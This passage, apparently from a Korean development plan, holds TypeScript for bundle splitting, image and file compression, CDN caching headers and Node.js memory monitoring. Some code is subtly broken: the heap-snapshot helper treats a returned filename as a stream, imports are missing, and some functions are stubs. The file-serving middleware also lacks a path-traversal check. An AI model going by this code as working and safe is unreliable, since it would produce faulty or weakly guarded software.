import CompressionPlugin from 'compression-webpack-plugin';
import { BundleAnalyzerPlugin } from 'webpack-bundle-analyzer';
import nodeExternals from 'webpack-node-externals';

// 백엔드 번들 최적화 설정
export const backendWebpackConfig: webpack.Configuration = {
  mode: process.env.NODE_ENV === 'production' ? 'production' : 'development',
  target: 'node',
  entry: {
    main: './src/main.ts',
    // 에이전트별 엔트리 포인트
    'agents/nl-input': './src/agents/nl-input-agent.ts',
    'agents/ui-selection': './src/agents/ui-selection-agent.ts',
    'agents/parsing': './src/agents/parsing-agent.ts',
    'agents/component-decision': './src/agents/component-decision-agent.ts',
    'agents/matching-rate': './src/agents/matching-rate-agent.ts',
    'agents/search': './src/agents/search-agent.ts',
    'agents/generation': './src/agents/generation-agent.ts',
    'agents/assembly': './src/agents/assembly-agent.ts',
    'agents/download': './src/agents/download-agent.ts'
  },
  output: {
    path: path.resolve(__dirname, '../../dist'),
    filename: '[name].js',
    libraryTarget: 'commonjs2'
  },
  externals: [nodeExternals()],
  module: {
    rules: [
      {
        test: /\.ts$/,
        use: 'ts-loader',
        exclude: /node_modules/
      }
    ]
  },
  resolve: {
    extensions: ['.ts', '.js'],
    alias: {
      '@': path.resolve(__dirname, '../src')
    }
  },
  optimization: {
    minimize: process.env.NODE_ENV === 'production',
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          keep_classnames: true,
          keep_fnames: true
        }
      })
    ],
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        commons: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'initial'
        },
        shared: {
          test: /[\\/]src[\\/]shared[\\/]/,
          name: 'shared',
          chunks: 'all',
          minSize: 0
        }
      }
    }
  },
  plugins: [
    new webpack.DefinePlugin({
      'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV)
    }),
    new CompressionPlugin({
      algorithm: 'gzip',
      test: /\.(js|ts)$/,
      threshold: 10240,
      minRatio: 0.8
    }),
    ...(process.env.ANALYZE === 'true' ? [
      new BundleAnalyzerPlugin({
        analyzerMode: 'static',
        reportFilename: 'bundle-report.html'
      })
    ] : [])
  ]
};

// Lambda 함수 최적화 설정
export class LambdaOptimizer {
  private functionConfigs: Map<string, webpack.Configuration> = new Map();
  
  // Lambda 함수별 최적화 설정 생성
  createLambdaConfig(functionName: string, entryPoint: string): webpack.Configuration {
    return {
      mode: 'production',
      target: 'node18',
      entry: entryPoint,
      output: {
        path: path.resolve(__dirname, `../../dist/lambda/${functionName}`),
        filename: 'index.js',
        libraryTarget: 'commonjs2'
      },
      externals: [
        // AWS SDK는 Lambda 런타임에 포함되어 있음
        /^@aws-sdk/,
        // 무거운 의존성은 Layer로 분리
        'sharp',
        'puppeteer',
        'canvas'
      ],
      optimization: {
        minimize: true,
        minimizer: [
          new TerserPlugin({
            terserOptions: {
              compress: {
                drop_console: true,
                drop_debugger: true,
                pure_funcs: ['console.log', 'console.info']
              },
              mangle: {
                reserved: ['handler', 'exports']
              },
              output: {
                comments: false
              }
            }
          })
        ],
        // Tree shaking 최적화
        usedExports: true,
        sideEffects: false
      },
      resolve: {
        extensions: ['.ts', '.js']
      },
      module: {
        rules: [
          {
            test: /\.ts$/,
            use: [
              {
                loader: 'ts-loader',
                options: {
                  transpileOnly: true,
                  compilerOptions: {
                    target: 'ES2022'
                  }
                }
              }
            ]
          }
        ]
      },
      plugins: [
        // 번들 크기 제한 (Lambda 제한: 50MB zipped)
        new webpack.optimize.LimitChunkCountPlugin({
          maxChunks: 1
        }),
        // 환경 변수 주입
        new webpack.EnvironmentPlugin({
          NODE_ENV: 'production',
          AWS_REGION: 'us-east-1'
        })
      ]
    };
  }
  
  // 모든 Lambda 함수 빌드
  async buildAllFunctions(): Promise<void> {
    const functions = [
      { name: 'nl-processor', entry: './src/lambda/nl-processor.ts' },
      { name: 'code-generator', entry: './src/lambda/code-generator.ts' },
      { name: 'component-searcher', entry: './src/lambda/component-searcher.ts' }
    ];
    
    for (const func of functions) {
      const config = this.createLambdaConfig(func.name, func.entry);
      await this.buildFunction(config);
      
      // 번들 크기 검증
      await this.validateBundleSize(func.name);
    }
  }
  
  private async buildFunction(config: webpack.Configuration): Promise<void> {
    return new Promise((resolve, reject) => {
      webpack(config, (err, stats) => {
        if (err || stats?.hasErrors()) {
          reject(err || new Error('Build failed'));
          return;
        }
        
        console.log(stats?.toString({
          colors: true,
          modules: false,
          children: false
        }));
        
        resolve();
      });
    });
  }
  
  private async validateBundleSize(functionName: string): Promise<void> {
    const bundlePath = path.resolve(__dirname, `../../dist/lambda/${functionName}/index.js`);
    const stats = await fs.stat(bundlePath);
    const sizeInMB = stats.size / (1024 * 1024);
    
    if (sizeInMB > 45) {
      throw new Error(`Lambda function ${functionName} bundle size (${sizeInMB.toFixed(2)}MB) exceeds safe limit`);
    }
    
    console.log(`✅ ${functionName} bundle size: ${sizeInMB.toFixed(2)}MB`);
  }
}

// 동적 임포트 헬퍼
export class DynamicImportManager {
  private loadedModules: Map<string, any> = new Map();
  
  // 에이전트 동적 로딩
  async loadAgent(agentName: string): Promise<any> {
    const cached = this.loadedModules.get(agentName);
    if (cached) {
      return cached;
    }
    
    try {
      const module = await import(
        /* webpackChunkName: "[request]" */
        `../agents/${agentName}-agent`
      );
      
      this.loadedModules.set(agentName, module.default);
      return module.default;
      
    } catch (error) {
      logger.error(`Failed to load agent ${agentName}:`, error);
      throw error;
    }
  }
  
  // 프리로드 힌트 생성
  generatePreloadHints(requiredAgents: string[]): string[] {
    return requiredAgents.map(agent => 
      `<link rel="preload" href="/agents/${agent}.js" as="script">`
    );
  }
  
  // 모듈 언로드
  unloadModule(moduleName: string): void {
    this.loadedModules.delete(moduleName);
    
    // 메모리에서 require 캐시 제거
    const resolvedPath = require.resolve(`../agents/${moduleName}-agent`);
    delete require.cache[resolvedPath];
  }
}

// 프론트엔드 코드 스플리팅 설정
export const frontendViteConfig = {
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          // 벤더 청크
          'vendor-react': ['react', 'react-dom', 'react-router-dom'],
          'vendor-ui': ['@mui/material', '@emotion/react', '@emotion/styled'],
          'vendor-utils': ['axios', 'lodash', 'date-fns'],
          'vendor-charts': ['recharts', 'd3'],
          
          // 기능별 청크
          'feature-editor': ['monaco-editor', '@monaco-editor/react'],
          'feature-analytics': ['./src/features/analytics/index.ts'],
          'feature-auth': ['./src/features/auth/index.ts']
        },
        // 청크 파일명 형식
        chunkFileNames: (chunkInfo) => {
          const facadeModuleId = chunkInfo.facadeModuleId ? 
            path.basename(chunkInfo.facadeModuleId, path.extname(chunkInfo.facadeModuleId)) : 
            'chunk';
          return `${facadeModuleId}.[hash].js`;
        }
      }
    },
    // 압축 설정
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: process.env.NODE_ENV === 'production',
        drop_debugger: true,
        pure_funcs: ['console.log', 'console.debug'],
        passes: 2
      }
    },
    // 청크 크기 경고
    chunkSizeWarningLimit: 500,
    // CSS 코드 스플리팅
    cssCodeSplit: true,
    // 소스맵 설정
    sourcemap: process.env.NODE_ENV !== 'production'
  },
  optimizeDeps: {
    include: ['react', 'react-dom'],
    exclude: ['@aws-sdk']
  }
};

// 런타임 코드 스플리팅 컴포넌트
export const LazyComponent = (importFunc: () => Promise<any>) => {
  return React.lazy(async () => {
    const startTime = performance.now();
    
    try {
      const module = await importFunc();
      const loadTime = performance.now() - startTime;
      
      // 로딩 성능 메트릭
      if (window.performance && window.performance.measure) {
        window.performance.measure('component-load', {
          start: startTime,
          duration: loadTime
        });
      }
      
      return module;
    } catch (error) {
      console.error('Failed to load component:', error);
      
      // 폴백 컴포넌트 반환
      return {
        default: () => <div>Failed to load component</div>
      };
    }
  });
};

// 프리페치 매니저
export class PrefetchManager {
  private prefetchQueue: Set<string> = new Set();
  private observer: IntersectionObserver;
  
  constructor() {
    // Intersection Observer로 뷰포트 진입 감지
    this.observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            const component = entry.target.getAttribute('data-prefetch');
            if (component) {
              this.prefetchComponent(component);
            }
          }
        });
      },
      { rootMargin: '50px' }
    );
  }
  
  // 컴포넌트 프리페치
  async prefetchComponent(componentPath: string): Promise<void> {
    if (this.prefetchQueue.has(componentPath)) {
      return;
    }
    
    this.prefetchQueue.add(componentPath);
    
    try {
      // 네트워크가 idle 상태일 때 프리페치
      if ('requestIdleCallback' in window) {
        requestIdleCallback(() => {
          import(componentPath);
        });
      } else {
        // 폴백: setTimeout 사용
        setTimeout(() => {
          import(componentPath);
        }, 1);
      }
    } catch (error) {
      console.error(`Failed to prefetch ${componentPath}:`, error);
    }
  }
  
  // 라우트 기반 프리페치
  prefetchRoute(route: string): void {
    const routeComponents: Record<string, string[]> = {
      '/dashboard': [
        './features/dashboard/index',
        './features/analytics/index'
      ],
      '/projects': [
        './features/projects/index',
        './features/editor/index'
      ],
      '/components': [
        './features/components/index',
        './features/search/index'
      ]
    };
    
    const components = routeComponents[route] || [];
    components.forEach(comp => this.prefetchComponent(comp));
  }
  
  // 엘리먼트 관찰 시작
  observe(element: HTMLElement): void {
    this.observer.observe(element);
  }
  
  // 정리
  disconnect(): void {
    this.observer.disconnect();
    this.prefetchQueue.clear();
  }
}
```

### SubTask 0.11.5: 리소스 최적화 및 압축
**목표**: 정적 리소스 최적화 및 압축 전략

**구현 내용**:
```typescript
// backend/src/performance/resource-optimizer.ts
import sharp from 'sharp';
import imagemin from 'imagemin';
import imageminPngquant from 'imagemin-pngquant';
import imageminMozjpeg from 'imagemin-mozjpeg';
import imageminSvgo from 'imagemin-svgo';
import { createReadStream, createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';
import zlib from 'zlib';
import crypto from 'crypto';

// 이미지 최적화 서비스
export class ImageOptimizationService {
  private readonly cachePath = './cache/images';
  private readonly supportedFormats = ['jpeg', 'jpg', 'png', 'webp', 'avif'];
  
  // 이미지 최적화
  async optimizeImage(
    inputPath: string,
    outputPath: string,
    options: {
      width?: number;
      height?: number;
      quality?: number;
      format?: string;
    } = {}
  ): Promise<void> {
    const { width, height, quality = 85, format } = options;
    
    // Sharp를 사용한 이미지 처리
    let sharpInstance = sharp(inputPath);
    
    // 리사이징
    if (width || height) {
      sharpInstance = sharpInstance.resize(width, height, {
        fit: 'inside',
        withoutEnlargement: true
      });
    }
    
    // 포맷 변환
    if (format && this.supportedFormats.includes(format)) {
      sharpInstance = sharpInstance.toFormat(format as any, { quality });
    }
    
    // 메타데이터 제거
    sharpInstance = sharpInstance.withMetadata({
      exif: false,
      icc: false,
      iptc: false,
      xmp: false
    });
    
    await sharpInstance.toFile(outputPath);
    
    // 추가 최적화
    await this.furtherOptimize(outputPath, format || 'jpeg');
  }
  
  // 추가 최적화 (imagemin 사용)
  private async furtherOptimize(filePath: string, format: string): Promise<void> {
    const plugins = [];
    
    switch (format) {
      case 'jpeg':
      case 'jpg':
        plugins.push(imageminMozjpeg({ quality: 85 }));
        break;
      case 'png':
        plugins.push(imageminPngquant({ quality: [0.6, 0.8] }));
        break;
      case 'svg':
        plugins.push(imageminSvgo());
        break;
    }
    
    if (plugins.length > 0) {
      await imagemin([filePath], {
        destination: path.dirname(filePath),
        plugins
      });
    }
  }
  
  // 반응형 이미지 생성
  async generateResponsiveImages(
    inputPath: string,
    outputDir: string,
    breakpoints: number[] = [320, 640, 960, 1280, 1920]
  ): Promise<Record<string, string>> {
    const results: Record<string, string> = {};
    const format = 'webp'; // 현대적인 포맷 사용
    
    for (const width of breakpoints) {
      const outputName = `image-${width}w.${format}`;
      const outputPath = path.join(outputDir, outputName);
      
      await this.optimizeImage(inputPath, outputPath, {
        width,
        format,
        quality: this.getQualityForWidth(width)
      });
      
      results[`${width}w`] = outputPath;
    }
    
    // 원본도 최적화
    const originalName = `image-original.${format}`;
    const originalPath = path.join(outputDir, originalName);
    await this.optimizeImage(inputPath, originalPath, { format });
    results['original'] = originalPath;
    
    return results;
  }
  
  // 너비에 따른 품질 결정
  private getQualityForWidth(width: number): number {
    if (width <= 640) return 70;
    if (width <= 1280) return 80;
    return 85;
  }
  
  // 이미지 캐싱 키 생성
  generateCacheKey(options: any): string {
    const hash = crypto
      .createHash('md5')
      .update(JSON.stringify(options))
      .digest('hex');
    return hash;
  }
}

// 파일 압축 서비스
export class CompressionService {
  // Gzip 압축
  async gzipFile(inputPath: string, outputPath: string): Promise<void> {
    const gzip = zlib.createGzip({ level: 9 });
    await pipeline(
      createReadStream(inputPath),
      gzip,
      createWriteStream(outputPath)
    );
  }
  
  // Brotli 압축
  async brotliFile(inputPath: string, outputPath: string): Promise<void> {
    const brotli = zlib.createBrotliCompress({
      params: {
        [zlib.constants.BROTLI_PARAM_QUALITY]: 11
      }
    });
    await pipeline(
      createReadStream(inputPath),
      brotli,
      createWriteStream(outputPath)
    );
  }
  
  // 자동 압축 결정
  async compressFile(
    inputPath: string,
    outputDir: string,
    acceptEncoding: string = ''
  ): Promise<string> {
    const filename = path.basename(inputPath);
    const stats = await fs.stat(inputPath);
    
    // 작은 파일은 압축하지 않음
    if (stats.size < 1024) {
      return inputPath;
    }
    
    // Brotli 지원 확인
    if (acceptEncoding.includes('br')) {
      const brotliPath = path.join(outputDir, `${filename}.br`);
      await this.brotliFile(inputPath, brotliPath);
      
      const brotliStats = await fs.stat(brotliPath);
      if (brotliStats.size < stats.size * 0.9) {
        return brotliPath;
      }
    }
    
    // Gzip 압축
    if (acceptEncoding.includes('gzip')) {
      const gzipPath = path.join(outputDir, `${filename}.gz`);
      await this.gzipFile(inputPath, gzipPath);
      
      const gzipStats = await fs.stat(gzipPath);
      if (gzipStats.size < stats.size * 0.9) {
        return gzipPath;
      }
    }
    
    return inputPath;
  }
}

// CDN 최적화 헤더
export class CDNOptimizer {
  // 파일 타입별 캐시 정책
  private cacheRules: Record<string, string> = {
    // 불변 리소스 (해시가 있는 파일)
    'js.hash': 'public, max-age=31536000, immutable',
    'css.hash': 'public, max-age=31536000, immutable',
    'jpg': 'public, max-age=86400, stale-while-revalidate=604800',
    'png': 'public, max-age=86400, stale-while-revalidate=604800',
    'webp': 'public, max-age=86400, stale-while-revalidate=604800',
    'svg': 'public, max-age=86400, stale-while-revalidate=604800',
    'woff2': 'public, max-age=31536000, immutable',
    'json': 'no-cache, must-revalidate',
    'html': 'no-cache, no-store, must-revalidate'
  };
  
  // 캐시 헤더 생성
  getCacheHeaders(filename: string): Record<string, string> {
    const ext = path.extname(filename).slice(1);
    const hasHash = /\.[a-f0-9]{8,}\./i.test(filename);
    
    const cacheKey = hasHash ? `${ext}.hash` : ext;
    const cacheControl = this.cacheRules[cacheKey] || 'public, max-age=3600';
    
    return {
      'Cache-Control': cacheControl,
      'Vary': 'Accept-Encoding',
      'X-Content-Type-Options': 'nosniff'
    };
  }
  
  // 조건부 요청 처리
  handleConditionalRequest(
    req: Request,
    res: Response,
    fileStats: fs.Stats,
    etag: string
  ): boolean {
    // ETag 확인
    if (req.headers['if-none-match'] === etag) {
      res.status(304).end();
      return true;
    }
    
    // Last-Modified 확인
    const lastModified = fileStats.mtime.toUTCString();
    if (req.headers['if-modified-since'] === lastModified) {
      res.status(304).end();
      return true;
    }
    
    // 헤더 설정
    res.setHeader('ETag', etag);
    res.setHeader('Last-Modified', lastModified);
    
    return false;
  }
  
  // 파일 ETag 생성
  generateETag(content: Buffer | string): string {
    const hash = crypto
      .createHash('md5')
      .update(content)
      .digest('hex');
    return `"${hash}"`;
  }
}

// 리소스 최적화 미들웨어
export function resourceOptimizationMiddleware(options: {
  imageOptimizer: ImageOptimizationService;
  compressionService: CompressionService;
  cdnOptimizer: CDNOptimizer;
}) {
  const { imageOptimizer, compressionService, cdnOptimizer } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // 정적 리소스 요청이 아니면 통과
    if (!req.path.match(/\.(jpg|jpeg|png|webp|svg|js|css|woff2)$/i)) {
      return next();
    }
    
    const filePath = path.join(process.cwd(), 'public', req.path);
    
    try {
      const stats = await fs.stat(filePath);
      
      // 조건부 요청 처리
      const content = await fs.readFile(filePath);
      const etag = cdnOptimizer.generateETag(content);
      
      if (cdnOptimizer.handleConditionalRequest(req, res, stats, etag)) {
        return;
      }
      
      // 캐시 헤더 설정
      const cacheHeaders = cdnOptimizer.getCacheHeaders(req.path);
      Object.entries(cacheHeaders).forEach(([key, value]) => {
        res.setHeader(key, value);
      });
      
      // 이미지 최적화
      if (req.path.match(/\.(jpg|jpeg|png|webp)$/i)) {
        const acceptHeader = req.headers.accept || '';
        const supportsWebP = acceptHeader.includes('image/webp');
        const supportsAvif = acceptHeader.includes('image/avif');
        
        // 최적 포맷 선택
        let format = 'original';
        if (supportsAvif) format = 'avif';
        else if (supportsWebP) format = 'webp';
        
        if (format !== 'original') {
          const cacheKey = imageOptimizer.generateCacheKey({
            path: req.path,
            format,
            width: req.query.w,
            quality: req.query.q
          });
          
          // 캐시 확인 및 최적화
          // ... 구현
        }
      }
      
      // 압축
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const compressedPath = await compressionService.compressFile(
        filePath,
        path.dirname(filePath),
        acceptEncoding
      );
      
      // 압축된 파일 전송
      if (compressedPath !== filePath) {
        const encoding = compressedPath.endsWith('.br') ? 'br' : 'gzip';
        res.setHeader('Content-Encoding', encoding);
      }
      
      res.sendFile(compressedPath);
      
    } catch (error) {
      next(error);
    }
  };
}

// 리소스 힌트 생성기
export class ResourceHintGenerator {
  // 리소스 힌트 생성
  generateHints(resources: Array<{ url: string; type: string; priority?: string }>): string[] {
    const hints: string[] = [];
    
    resources.forEach(resource => {
      // Preconnect (외부 도메인)
      if (resource.url.startsWith('http')) {
        const origin = new URL(resource.url).origin;
        hints.push(`<link rel="preconnect" href="${origin}">`);
        hints.push(`<link rel="dns-prefetch" href="${origin}">`);
      }
      
      // Preload (중요 리소스)
      if (resource.priority === 'high') {
        const as = this.getResourceType(resource.type);
        hints.push(`<link rel="preload" href="${resource.url}" as="${as}">`);
      }
      
      // Prefetch (다음에 필요한 리소스)
      if (resource.priority === 'low') {
        hints.push(`<link rel="prefetch" href="${resource.url}">`);
      }
    });
    
    // 중복 제거
    return [...new Set(hints)];
  }
  
  private getResourceType(mimeType: string): string {
    if (mimeType.includes('javascript')) return 'script';
    if (mimeType.includes('css')) return 'style';
    if (mimeType.includes('image')) return 'image';
    if (mimeType.includes('font')) return 'font';
    return 'fetch';
  }
  
  // Critical CSS 추출
  async extractCriticalCSS(html: string, css: string): Promise<string> {
    // 실제 구현에서는 puppeteer나 penthouse 사용
    // 여기서는 간단한 예시
    const criticalSelectors = [
      'body', 'header', 'nav', 'main',
      '.hero', '.container', '.btn-primary'
    ];
    
    // CSS 파싱 및 필터링
    // ... 구현
    
    return css; // 임시
  }
}
```

---

### SubTask 0.11.6: 메모리 관리 최적화
**목표**: Node.js 애플리케이션의 메모리 사용 최적화

**구현 내용**:
```typescript
// backend/src/performance/memory-manager.ts
import v8 from 'v8';
import { performance } from 'perf_hooks';
import { EventEmitter } from 'events';
import { logger } from '../config/logger';

// 메모리 임계값 설정 (MB)
const MEMORY_THRESHOLDS = {
  WARNING: 1024,    // 1GB
  CRITICAL: 1536,   // 1.5GB
  MAX: 2048        // 2GB
};

export class MemoryManager extends EventEmitter {
  private monitoringInterval: NodeJS.Timer | null = null;
  private gcForceThreshold = 0.85; // 힙 사용률 85%에서 GC 강제 실행
  private memoryLeakDetector: MemoryLeakDetector;
  
  constructor() {
    super();
    this.memoryLeakDetector = new MemoryLeakDetector();
    this.setupGCEvents();
  }
  
  // 메모리 모니터링 시작
  startMonitoring(intervalMs: number = 30000): void {
    if (this.monitoringInterval) {
      return;
    }
    
    this.monitoringInterval = setInterval(() => {
      this.checkMemoryUsage();
    }, intervalMs);
    
    logger.info('Memory monitoring started');
  }
  
  // 메모리 모니터링 중지
  stopMonitoring(): void {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
      logger.info('Memory monitoring stopped');
    }
  }
  
  // 현재 메모리 상태 조회
  getMemoryStatus(): MemoryStatus {
    const memUsage = process.memoryUsage();
    const heapStats = v8.getHeapStatistics();
    
    const heapUsedMB = memUsage.heapUsed / 1024 / 1024;
    const heapTotalMB = memUsage.heapTotal / 1024 / 1024;
    const rssMB = memUsage.rss / 1024 / 1024;
    const externalMB = memUsage.external / 1024 / 1024;
    
    const heapUsagePercent = (heapStats.used_heap_size / heapStats.heap_size_limit) * 100;
    
    return {
      rss: rssMB,
      heapUsed: heapUsedMB,
      heapTotal: heapTotalMB,
      external: externalMB,
      heapUsagePercent,
      heapSizeLimit: heapStats.heap_size_limit / 1024 / 1024,
      totalPhysicalSize: heapStats.total_physical_size / 1024 / 1024,
      totalAvailableSize: heapStats.total_available_size / 1024 / 1024,
      usedHeapSize: heapStats.used_heap_size / 1024 / 1024,
      heapSpaces: this.getHeapSpaceInfo()
    };
  }
  
  // 힙 공간별 정보
  private getHeapSpaceInfo(): HeapSpaceInfo[] {
    const spaces = v8.getHeapSpaceStatistics();
    return spaces.map(space => ({
      spaceName: space.space_name,
      spaceSize: space.space_size / 1024 / 1024,
      spaceUsedSize: space.space_used_size / 1024 / 1024,
      spaceAvailableSize: space.space_available_size / 1024 / 1024,
      physicalSpaceSize: space.physical_space_size / 1024 / 1024
    }));
  }
  
  // 메모리 사용량 확인
  private checkMemoryUsage(): void {
    const status = this.getMemoryStatus();
    
    // 임계값 확인
    if (status.heapUsed > MEMORY_THRESHOLDS.CRITICAL) {
      this.emit('memory:critical', status);
      this.handleCriticalMemory(status);
    } else if (status.heapUsed > MEMORY_THRESHOLDS.WARNING) {
      this.emit('memory:warning', status);
    }
    
    // 힙 사용률 확인
    if (status.heapUsagePercent > this.gcForceThreshold * 100) {
      this.forceGarbageCollection();
    }
    
    // 메모리 누수 감지
    this.memoryLeakDetector.addSample(status);
    
    // 메트릭 기록
    this.recordMemoryMetrics(status);
  }
  
  // 위험 메모리 상태 처리
  private handleCriticalMemory(status: MemoryStatus): void {
    logger.error('Critical memory usage detected', status);
    
    // 1. 강제 가비지 컬렉션
    this.forceGarbageCollection();
    
    // 2. 캐시 정리
    this.emit('memory:cleanup:cache');
    
    // 3. 대용량 객체 해제
    this.emit('memory:cleanup:objects');
    
    // 4. 여전히 높으면 일부 기능 제한
    if (status.heapUsed > MEMORY_THRESHOLDS.MAX) {
      this.emit('memory:limit:features');
    }
  }
  
  // 강제 가비지 컬렉션
  private forceGarbageCollection(): void {
    if (global.gc) {
      const before = process.memoryUsage().heapUsed;
      global.gc();
      const after = process.memoryUsage().heapUsed;
      const freed = (before - after) / 1024 / 1024;
      
      logger.info(`Forced GC: freed ${freed.toFixed(2)} MB`);
    }
  }
  
  // GC 이벤트 설정
  private setupGCEvents(): void {
    if (!performance.nodeTiming) return;
    
    const obs = new PerformanceObserver((list) => {
      const entries = list.getEntries();
      entries.forEach((entry) => {
        if (entry.entryType === 'gc') {
          this.handleGCEvent(entry as any);
        }
      });
    });
    
    obs.observe({ entryTypes: ['gc'] });
  }
  
  // GC 이벤트 처리
  private handleGCEvent(gcEntry: any): void {
    const gcInfo = {
      type: gcEntry.detail.kind,
      duration: gcEntry.duration,
      timestamp: gcEntry.startTime
    };
    
    this.emit('gc', gcInfo);
    
    // 긴 GC 경고
    if (gcEntry.duration > 100) {
      logger.warn('Long GC detected', gcInfo);
    }
  }
  
  // 메모리 메트릭 기록
  private recordMemoryMetrics(status: MemoryStatus): void {
    // Prometheus 메트릭 업데이트
    const { MetricsHelper } = require('../config/metrics');
    MetricsHelper.recordMemoryUsage(status);
  }
  
  // 힙 스냅샷 생성
  async createHeapSnapshot(filename?: string): Promise<string> {
    const snapshotPath = filename || `heapdump-${Date.now()}.heapsnapshot`;
    
    return new Promise((resolve, reject) => {
      const stream = v8.writeHeapSnapshot(snapshotPath);
      stream.on('finish', () => {
        logger.info(`Heap snapshot created: ${snapshotPath}`);
        resolve(snapshotPath);
      });
      stream.on('error', reject);
    });
  }
  
  // 메모리 프로파일링
  async profileMemory(durationMs: number = 60000): Promise<MemoryProfile> {
    const startUsage = process.memoryUsage();
    const samples: MemoryStatus[] = [];
    const interval = 1000; // 1초마다 샘플링
    
    const samplingInterval = setInterval(() => {
      samples.push(this.getMemoryStatus());
    }, interval);
    
    await new Promise(resolve => setTimeout(resolve, durationMs));
    clearInterval(samplingInterval);
    
    const endUsage = process.memoryUsage();
    
    return {
      duration: durationMs,
      samples,
      startUsage,
      endUsage,
      summary: this.analyzeMemoryProfile(samples)
    };
  }
  
  // 메모리 프로파일 분석
  private analyzeMemoryProfile(samples: MemoryStatus[]): MemoryProfileSummary {
    const heapUsedValues = samples.map(s => s.heapUsed);
    
    return {
      avgHeapUsed: heapUsedValues.reduce((a, b) => a + b, 0) / heapUsedValues.length,
      maxHeapUsed: Math.max(...heapUsedValues),
      minHeapUsed: Math.min(...heapUsedValues),
      trend: this.calculateMemoryTrend(heapUsedValues),
      volatility: this.calculateVolatility(heapUsedValues)
    };
  }
  
  // 메모리 추세 계산
  private calculateMemoryTrend(values: number[]): 'increasing' | 'stable' | 'decreasing' {
    if (values.length < 2) return 'stable';
    
    const firstHalf = values.slice(0, Math.floor(values.length / 2));
    const secondHalf = values.slice(Math.floor(values.length / 2));
    
    const firstAvg = firstHalf.reduce((a, b) => a + b, 0) / firstHalf.length;
    const secondAvg = secondHalf.reduce((a, b) => a + b, 0) / secondHalf.length;
    
    const change = ((secondAvg - firstAvg) / firstAvg) * 100;
    
    if (change > 10) return 'increasing';
    if (change < -10) return 'decreasing';
    return 'stable';
  }
  
  // 변동성 계산
  private calculateVolatility(values: number[]): number {
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const variance = values.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / values.length;
    return Math.sqrt(variance);
  }
}

// 메모리 누수 감지기
class MemoryLeakDetector {
  private samples: MemoryStatus[] = [];
  private readonly maxSamples = 60; // 30분간 데이터 (30초 간격)
  private readonly leakThreshold = 0.1; // 10% 증가율
  
  addSample(status: MemoryStatus): void {
    this.samples.push(status);
    
    if (this.samples.length > this.maxSamples) {
      this.samples.shift();
    }
    
    if (this.samples.length >= 10) {
      this.detectLeak();
    }
  }
  
  private detectLeak(): void {
    const recentSamples = this.samples.slice(-10);
    const trend = this.calculateTrend(recentSamples);
    
    if (trend.slope > this.leakThreshold && trend.r2 > 0.8) {
      logger.warn('Potential memory leak detected', {
        slope: trend.slope,
        r2: trend.r2,
        currentHeap: recentSamples[recentSamples.length - 1].heapUsed
      });
    }
  }
  
  // 선형 회귀 분석
  private calculateTrend(samples: MemoryStatus[]): { slope: number; r2: number } {
    const n = samples.length;
    const x = samples.map((_, i) => i);
    const y = samples.map(s => s.heapUsed);
    
    const sumX = x.reduce((a, b) => a + b, 0);
    const sumY = y.reduce((a, b) => a + b, 0);
    const sumXY = x.reduce((sum, xi, i) => sum + xi * y[i], 0);
    const sumX2 = x.reduce((sum, xi) => sum + xi * xi, 0);
    
    const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
    const intercept = (sumY - slope * sumX) / n;
    
    // R² 계산
    const yMean = sumY / n;
    const ssTotal = y.reduce((sum, yi) => sum + Math.pow(yi - yMean, 2), 0);
    const ssResidual = y.reduce((sum, yi, i) => {
      const prediction = slope * x[i] + intercept;
      return sum + Math.pow(yi - prediction, 2);
    }, 0);
    
    const r2 = 1 - (ssResidual / ssTotal);
    
    return { slope: slope / yMean, r2 }; // 정규화된 기울기
  }
}

// 메모리 풀 관리자
export class MemoryPoolManager<T> {
  private pool: T[] = [];
  private inUse: Set<T> = new Set();
  private factory: () => T;
  private reset: (obj: T) => void;
  private maxSize: number;
  
  constructor(options: {
    factory: () => T;
    reset: (obj: T) => void;
    initialSize?: number;
    maxSize?: number;
  }) {
    this.factory = options.factory;
    this.reset = options.reset;
    this.maxSize = options.maxSize || 100;
    
    // 초기 풀 생성
    const initialSize = options.initialSize || 10;
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(this.factory());
    }
  }
  
  // 객체 획득
  acquire(): T {
    let obj = this.pool.pop();
    
    if (!obj) {
      obj = this.factory();
    }
    
    this.inUse.add(obj);
    return obj;
  }
  
  // 객체 반환
  release(obj: T): void {
    if (!this.inUse.has(obj)) {
      return;
    }
    
    this.inUse.delete(obj);
    this.reset(obj);
    
    if (this.pool.length < this.maxSize) {
      this.pool.push(obj);
    }
  }
  
  // 풀 상태
  getStats(): { poolSize: number; inUse: number } {
    return {
      poolSize: this.pool.length,
      inUse: this.inUse.size
    };
  }
  
  // 풀 정리
  clear(): void {
    this.pool = [];
    this.inUse.clear();
  }
}

// WeakMap 기반 캐시
export class WeakCache<K extends object, V> {
  private cache = new WeakMap<K, { value: V; timestamp: number }>();
  private ttl: number;
  
  constructor(ttlMs: number = 60000) {
    this.ttl = ttlMs;
  }
  
  set(key: K, value: V): void {
    this.cache.set(key, {
      value,
      timestamp: Date.now()
    });
  }
  
  get(key: K): V | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) {
      return undefined;
    }
    
    if (Date.now() - entry.timestamp > this.ttl) {
      this.cache.delete(key);
      return undefined;
    }
    
    return entry.value;
  }
  
  has(key: K): boolean {
    return this.get(key) !== undefined;
  }
  
  delete(key: K): boolean {
    return this.cache.delete(key);
  }
}

// 타입 정의
interface MemoryStatus {
  rss: number;
  heapUsed: number;
  heapTotal: number;
  external: number;
  heapUsagePercent: number;
  heapSizeLimit: number;
  totalPhysicalSize: number;
  totalAvailableSize: number;
  usedHeapSize: number;
  heapSpaces: HeapSpaceInfo[];
}

interface HeapSpaceInfo {
  spaceName: string;
  spaceSize: number;
  spaceUsedSize: number;
